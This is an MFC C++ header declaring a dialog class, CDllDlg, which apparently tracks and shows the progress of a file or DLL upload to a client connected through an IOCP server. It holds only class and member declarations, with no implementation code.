#if !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
#define AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// DllDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CDllDlg dialog

class CDllDlg : public CDialog
{
// Construction
public:
	CDllDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	//void SendSelectCommand(PBYTE pData, UINT nSize);
	CString m_strOperatingFile; // 文件名
	__int64 m_nOperatingFileLength; // 文件总大小
	__int64	m_nCounter;// 计数器
	bool m_bIsStop;
	CString m_strOperatingPath;
	CListCtrl* m_pListCtrl;
	LPBYTE lparam;
	DWORD dwSizeofbuff;
// Dialog Data
	//{{AFX_DATA(CDllDlg)
	enum { IDD = IDD_DLLDLG };
	CXTPProgressCtrl	m_dlldlg_progress;
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CDllDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	void GetServerVersion();
	void ShowProgress();
	void SendFileData();
	void EndLocalUploadFile();
	BOOL SendUploadJob();
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	// Generated message map functions
	//{{AFX_MSG(CDllDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
